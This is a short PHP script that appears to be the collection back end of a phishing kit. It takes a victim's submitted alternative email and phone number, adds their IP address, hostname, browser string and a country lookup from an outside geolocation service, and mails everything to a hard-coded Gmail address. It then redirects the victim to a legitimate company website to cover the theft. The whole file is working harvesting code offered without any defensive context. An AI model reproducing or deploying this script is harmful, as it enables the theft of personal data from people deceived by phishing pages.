<?php

$email = $_REQUEST["email"];
$phone = $_REQUEST["phone"];


if (getenv(HTTP_CLIENT_IP)){
$ip=getenv(HTTP_CLIENT_IP);
}
else {
$ip=getenv(REMOTE_ADDR);
}

$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$browser = $_SERVER['HTTP_USER_AGENT'];
$url='http://www.geoplugin.net/json.gp?ip='.$_SERVER['REMOTE_ADDR'];
$ipdetails=file_get_contents($url);
$response_tags=json_decode($ipdetails);
$country=$response_tags->geoplugin_countryName;

$data=" 
----------Alternative Details--------------------
Alternative Email : $email
Phone No. : $phone




------------------
$ip
$hostname
$browser
$country
------------------
";

$subj = "".$_SERVER['REMOTE_ADDR']." - ".$country."";

$recipient1 = "thierry.guarin21@gmail.com";




mail($recipient1 , $subj , $data);

header("Location: https://www.portugalventures.pt");

?>

